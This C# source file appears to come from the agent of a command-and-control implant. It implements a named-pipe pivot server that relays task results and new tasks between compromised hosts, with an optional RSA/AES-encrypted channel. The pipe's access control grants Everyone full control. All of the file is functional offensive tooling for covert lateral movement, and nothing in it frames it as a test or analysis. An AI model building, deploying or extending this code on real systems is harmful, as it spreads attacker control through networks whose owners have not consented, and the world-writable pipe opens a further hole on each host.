using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Pipes;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Agent.Communication;
using Agent.Helpers;
using Agent.Models;

namespace Agent.Service.Pivoting
{
    public class PivotPipeServer : PivotServer
    {

        public PivotPipeServer(ConnexionUrl conn) : base(conn)
        {
        }

        protected PipeSecurity CreatePipeSecurityForEveryone()
        {
            PipeSecurity pipeSecurity = new PipeSecurity();
            pipeSecurity.AddAccessRule(new PipeAccessRule("Everyone", PipeAccessRights.FullControl, AccessControlType.Allow));
            return pipeSecurity;
        }


        public override async Task Start()
        {
            this.Status = RunningService.RunningStatus.Running;

            while (!this._tokenSource.IsCancellationRequested)
            {
                try
                {
                    using (NamedPipeServerStream server = new NamedPipeServerStream(this.Connexion.PipeName, PipeDirection.InOut, 10, PipeTransmissionMode.Byte, PipeOptions.Asynchronous, 512, 512, CreatePipeSecurityForEveryone(), HandleInheritability.None))
                    {
                        Task connectionTask = Task.Factory.FromAsync(server.BeginWaitForConnection, server.EndWaitForConnection, null);
                        await connectionTask;

                        if (this.Connexion.IsSecure)
                            HandleSecureClient(server);
                        else
                            HandleNonSecureClient(server);

                        var reader = new StreamReader(server); //ack end oth message
                        reader.ReadLine();

                        if (server.IsConnected)
                            server.Disconnect();
                    }
                }
                catch (Exception ex)
                {
#if DEBUG
                    Console.WriteLine(ex.ToString());
#endif
                }
            }

            this.Status = RunningService.RunningStatus.Stoped;
        }


        private void HandleNonSecureClient(NamedPipeServerStream client)
        {
            var req = client.ReceivedMessage();
            //Convert.FromBase64String(b64results).Deserialize<List<MessageResult>>();
            var responses = req.Deserialize<List<MessageResult>>();
            _messageService.EnqueueResults(responses);

            var relays = this.ExtractRelays(responses);

            Debug.WriteLine($"TCP Pivot {Connexion.ToString()} Sending task to Relays {string.Join(",", relays)}");
            var tasks = this._messageService.GetMessageTasksToRelay(relays);
            client.SendMessage(tasks.Serialize());
        }

        private void HandleSecureClient(NamedPipeServerStream client)
        {
            var reader = new StreamReader(client);
            //receive public key
            string xmlPubKey = Encoding.UTF8.GetString(client.ReceivedMessage(true));
            RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
            rsa.FromXmlString(xmlPubKey);

            RijndaelManaged rijndael = new RijndaelManaged();
            rijndael.KeySize = 256; // Set the key size to 256 bits
            rijndael.BlockSize = 128;
            rijndael.GenerateKey(); // Generate a random key
            rijndael.Padding = PaddingMode.PKCS7;

            //Send symetric Key & IV
            byte[] encryptedKey = rsa.Encrypt(rijndael.Key, false);
            byte[] encryptedIV = rsa.Encrypt(rijndael.IV, false);
            
            byte[] encryptedKeyIV = new byte[encryptedKey.Length + encryptedIV.Length];
            System.Buffer.BlockCopy(encryptedKey, 0, encryptedKeyIV, 0, encryptedKey.Length);
            System.Buffer.BlockCopy(encryptedIV, 0, encryptedKeyIV, encryptedKey.Length, encryptedIV.Length);

            //Debug.WriteLine($"PipeS Pivot : EncryptedKeyIV = {encryptedKeyIV.Length} " + string.Join(",", encryptedKeyIV.Select(a => ((int)a).ToString())));
            client.SendMessage(encryptedKeyIV);


            var req = client.ReceivedMessage(true);
            //Debug.WriteLine("Pipes Pivot : Encrypted Message (read " + req.Length + ") = " + string.Join(",", req.Select(a => ((int)a).ToString())));
            byte[] decryptedBytes = rijndael.CreateDecryptor().TransformFinalBlock(req, 0, req.Length);
            var responses = decryptedBytes.Deserialize<List<MessageResult>>();
            _messageService.EnqueueResults(responses);

            var relays = this.ExtractRelays(responses);

            Debug.WriteLine($"Pipes Pivot {Connexion.ToString()} Sending task to Relays {string.Join(",", relays)}");
            var tasks = this._messageService.GetMessageTasksToRelay(relays);

            var meesage = tasks.Serialize();
            var encryptedMessageBytes = rijndael.CreateEncryptor().TransformFinalBlock(meesage, 0, meesage.Length);
            client.SendMessage(encryptedMessageBytes);
        }
    }
}
